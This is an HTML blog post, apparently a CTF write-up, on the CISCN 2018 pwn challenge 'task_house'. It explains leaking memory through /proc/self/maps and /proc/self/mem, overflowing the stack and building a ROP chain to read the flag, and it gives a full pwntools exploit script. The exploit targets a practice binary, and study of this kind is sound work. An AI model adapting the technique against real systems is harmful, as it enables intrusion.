@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>需要读取maps和mem文件的pwn | DaJun的Blog | 我想变成大牛，很大的那种</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="pwn">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":true,"app_id":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","app_key":"Qn93YchF3LXlS54tbXjzMvAI","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","appkey":"Qn93YchF3LXlS54tbXjzMvAI","notify":true,"verify":true,"placeholder":"想说什么...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/girl.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">DaJun</h5>
+          <a href="mailto:571986260@qq.com" title="571986260@qq.com" class="mail">
+            
+              <span>5</span>
+            
+              <span>7</span>
+            
+              <span>1</span>
+            
+              <span>9</span>
+            
+              <span>8</span>
+            
+              <span>6</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/DayJun" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>需要读取maps和mem文件的pwn</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/dawn.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">需要读取maps和mem文件的pwn</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-12-19T13:49:21.000Z" itemprop="datePublished" class="page-time">
+  2019-12-19
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/学习日记/">学习日记</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-需要读取maps和mem文件的pwn"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">需要读取maps和mem文件的pwn</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-12-19 21:49:21" datetime="2019-12-19T13:49:21.000Z"  itemprop="datePublished">2019-12-19</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/学习日记/">学习日记</a></li></ul>
+
+
+
+            
+	<span id="/2019/12/19/需要读取maps和mem文件的pwn/" class="leancloud_visitors" data-flag-title="需要读取maps和mem文件的pwn" title="需要读取maps和mem文件的pwn">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2019/12/19/需要读取maps和mem文件的pwn/#comment">
+            <span class="valine-comment-count" data-xid="/2019/12/19/需要读取maps和mem文件的pwn/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p>这道题是ciscn2018的一道pwn，其中需要读取<code>/proc/self/maps</code>文件和<code>/proc/self/mem</code>文件和<code>/proc/self/mem</code>文件</p>
+<p>文件都在：[Github](<a href="https://github.com/DayJun/Blogs/tree/master/Articles/ciscn2018" target="_blank" rel="noopener">https://github.com/DayJun/Blogs/tree/master/Articles/ciscn2018</a> task_house)</p>
+<a id="more"></a>
+
+<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/dajun/binary/pwn_question/heap/ciscn2018 task_house/task_house'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>保护全开</p>
+<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>仅限制不能打开flag文件，以及栈溢出</p>
+<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><ul>
+<li><p>打开<code>/proc/self/maps</code>文件，能得到elf基地址以及clone出的线程的栈地址</p>
+</li>
+<li><p>打开<code>/proc/self/mem</code>文件，扫描搜索我们得到的栈地址的内存空间，如果其中存在<code>/proc/self/mem</code>字符串则代表我们找到了当前栈空间</p>
+</li>
+<li><p>通过打开文件的函数进行栈溢出，将栈上存储的<code>malloc</code>出的地址修改为<code>read</code>函数返回地址所对应的栈地址</p>
+</li>
+<li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"What do you want to give me?"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"content: "</span>);</span><br><span class="line">        read(<span class="number">0</span>, v8, <span class="number">0x200</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>通过这个函数对<code>v8</code>即我们已经修改的地址写rop链，read函数返回的时候就会直接rop</p>
+</li>
+</ul>
+<p>因为它本身有四个文件描述符：<code>stdin</code>，<code>stdout</code>，<code>stderr</code>，<code>/dev/urandom</code></p>
+<p>而我们又打开了两个文件：<code>/proc/self/maps</code>，<code>/proc/self/mem</code></p>
+<p>所以我们rop的时候打开的flag文件的文件描述符是6</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x:log.success(x)</span><br><span class="line">io = <span class="number">0</span></span><br><span class="line">binary = <span class="string">'./task_house'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(name)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">'finding?\n'</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span><span class="params">(locate)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    ru(<span class="string">'you?\n'</span>)</span><br><span class="line">    sl(str(locate))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(n)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">'get?\n'</span>)</span><br><span class="line">    sl(str(n))</span><br><span class="line">    ru(<span class="string">'something:\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> rn(n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give</span><span class="params">(cont)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    ru(<span class="string">'content: \n'</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io = process(binary)</span><br><span class="line">    ru(<span class="string">'Y/n?\n'</span>)</span><br><span class="line">    sl(<span class="string">'y'</span>)</span><br><span class="line">    find(<span class="string">"/proc/self/maps"</span>)</span><br><span class="line">    rv = get(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">    elf_base = int(rv[:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">    pop_rdi = elf_base + <span class="number">0x1823</span></span><br><span class="line">    pop_rsi = elf_base + <span class="number">0x1821</span></span><br><span class="line">    stack_start = int(rv[<span class="number">506</span>:<span class="number">518</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="comment">#stack_start = int(rv[530:542], 16)</span></span><br><span class="line">    success(<span class="string">"stack address: 0x%x\nelf base: 0x%x"</span> %(stack_start, elf_base))</span><br><span class="line">    stack_size = <span class="number">0x10000000</span></span><br><span class="line">    how_many = <span class="number">100000</span></span><br><span class="line"></span><br><span class="line">    stack_start = stack_start + <span class="number">0x150000</span>	<span class="comment">#这个是我瞎写的一个偏移</span></span><br><span class="line"></span><br><span class="line">    find(<span class="string">"/proc/self/mem"</span>)</span><br><span class="line">    locate(stack_start)</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    cont = <span class="number">0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):		<span class="comment"># 在24轮里面搜索栈空间</span></span><br><span class="line">        cont = get(how_many)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'/proc/self/mem'</span> <span class="keyword">in</span> cont:</span><br><span class="line">            count = i</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pos = cont.index(<span class="string">'/proc/self/mem'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    str_pos = pos + stack_start + how_many * count</span><br><span class="line">    read_ret_pos = str_pos - <span class="number">0x38</span></span><br><span class="line">    success(<span class="string">"ret address: 0x%x\nstr pos: 0x%x"</span> %(read_ret_pos, str_pos))</span><br><span class="line">    payload = <span class="string">"/proc/self/mem"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(read_ret_pos)</span><br><span class="line">    find(payload)	<span class="comment"># 把v8的地址修改成read_ret_pos</span></span><br><span class="line">    flag_address = read_ret_pos + <span class="number">15</span>*<span class="number">8</span></span><br><span class="line">    open_address = elf_base + <span class="number">0xC00</span></span><br><span class="line">    read_address = elf_base + <span class="number">0xBA0</span></span><br><span class="line">    puts_address = elf_base + <span class="number">0xB00</span></span><br><span class="line">    payload = p64(pop_rdi) + p64(flag_address) + p64(pop_rsi) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(open_address) + p64(pop_rdi) + p64(<span class="number">6</span>) + p64(pop_rsi) + p64(flag_address) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(read_address) + p64(pop_rdi) + p64(flag_address) + p64(puts_address)</span><br><span class="line">    payload += <span class="string">"flag\x00"</span></span><br><span class="line">    give(payload)	<span class="comment">#这里就可以进行rop了</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    <span class="keyword">print</span> rn(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        a = pwn()	<span class="comment">#因为mmap出来的内存太大了，而我们一次能搜索的空间又很小，所以需要碰运气</span></span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io.kill()</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>遇到一个奇怪的事情，如果在脚本中执行<code>gdb.attach(io)</code>，然后再下断点，执行到断点的时候程序会因为收到了断点的那个信号而退出，导致不好调试</p>
+<p>通过<code>/proc/self/maps</code>或者<code>/proc/pidof something/maps</code>可以知道程序的各个区间</p>
+<p>通过<code>/proc/self/mem</code>或者<code>/proc/pidof something/mem</code>可以读到程序的内存空间</p>
+<p><code>int clone(int (*fn)(void * arg), void *stack, int flags, void * arg);</code>创建了一个执行<code>fn</code>函数的，以<code>stack</code>为栈空间的线程</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-12-19T14:14:01.861Z" itemprop="dateUpdated">2019-12-19 22:14:01</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/12/19/需要读取maps和mem文件的pwn/" target="_blank" rel="external">http://dayjun.top/2019/12/19/需要读取maps和mem文件的pwn/</a>
+        
+    </div>
+    <footer>
+        <a href="http://dayjun.top">
+            <img src="/img/girl.jpg" alt="DaJun">
+            DaJun
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2019/12/19/需要读取maps和mem文件的pwn/&title=《需要读取maps和mem文件的pwn》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2019/12/19/需要读取maps和mem文件的pwn/&title=《需要读取maps和mem文件的pwn》 — DaJun的Blog&source=这道题是ciscn2018的一道pwn，其中需要读取/proc/self/maps文件和/proc/self/mem文件和/proc/self/mem文件..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/12/18/学习IO-FILE的任意读和任意写/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">学习IO_FILE的任意读和任意写</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#checksec"><span class="post-toc-number">1.</span> <span class="post-toc-text">checksec</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞点"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞点</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用方法"><span class="post-toc-number">3.</span> <span class="post-toc-text">利用方法</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exp"><span class="post-toc-number">4.</span> <span class="post-toc-text">exp</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">5.</span> <span class="post-toc-text">总结</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.png" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://3nd.xyz/" target="_blank">3ND</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://blog.douluodalu.wang/" target="_blank">PwmHt</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                DaJun &copy; 2019
+            </span>
+        		
+           	
+           	<span>
+           		<a href="http://www.miitbeian.gov.cn/" target="_blank">苏ICP备19059861号</a>
+           	</span>
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2019/12/19/需要读取maps和mem文件的pwn/&title=《需要读取maps和mem文件的pwn》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2019/12/19/需要读取maps和mem文件的pwn/&title=《需要读取maps和mem文件的pwn》 — DaJun的Blog&source=这道题是ciscn2018的一道pwn，其中需要读取/proc/self/maps文件和/proc/self/mem文件和/proc/self/mem文件..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACq0lEQVR42u3aQW7CQAwFUO5/abqtREm/7XGoqpcVgpL4sZiZfvvxiK/nt+v7O9efvruqd3j9+8MXHh4e3qD061Je33/34GtGwrt+blIzHh4e3jbv3Yrae3y+YUzuc10zHh4e3t/kXf9lsg0kpePh4eH9D17yer7ZJMd0PDw8vE/xeot1HsJOFv2bshY8PDy8mJd3kf7O65X+Hh4eHt64q54vvklUkYcUeXjxS4V4eHh4C7zqobbXzp+006qV4OHh4d3Dqzao5lFvL+Cohhp4eHh4G7y8JZ/HE71AIT+UF+rEw8PDW+DlhVYX/eru1GuYRY03PDw8vDXeqXGB/AA9Z0dDA3h4eHhrvOrGMNlIDrS18qM2Hh4e3lFe0sSaNPh7I1yTZ+Hh4eFt8/LHz2OI3ojAfJALDw8P7ywvX74nLatJ6dX/D97m03h4eHiHeHk0UC3uEV/JsT7ZqKK9Dg8PD+8QLym0Gub27jP/Fh4eHt49vLyhNYkJqgv9POTFw8PD2+D1GkjVQavkp6m+E20qeHh4eAu8PJjo9dZ6A1iTSLcwOoCHh4c35lWL2I5rc145pcbDw8Mb8+YjVvnxurcxjOrEw8PDO8rrPebURjJpgEVHajw8PLwbeUmUkEfAk/GpSZiLh4eHt8GbJ755xFBtg/VGwX74Fh4eHt5RXnVZz5f7fKHPRwfKn+Lh4eEt8HqYfOCgGmFMhsCaXT48PDy8Iu9ZvKqtr+vvVpttST14eHh427zJyFTe4pqExfMfEQ8PD2+Dlwev+evJMEHCKEQneHh4eGu8vNXUiyHyzaZ6RC60wfDw8PBu5/XC1mR76I0gRBsSHh4e3kd5ecy6NyhQbs7h4eHhrfGqy3QVcKpZVW7X4eHh4S3w8pvmzbBqC21+uD/Q38PDw8P7nfcF9uu7YHxIt8oAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.4"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.4"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
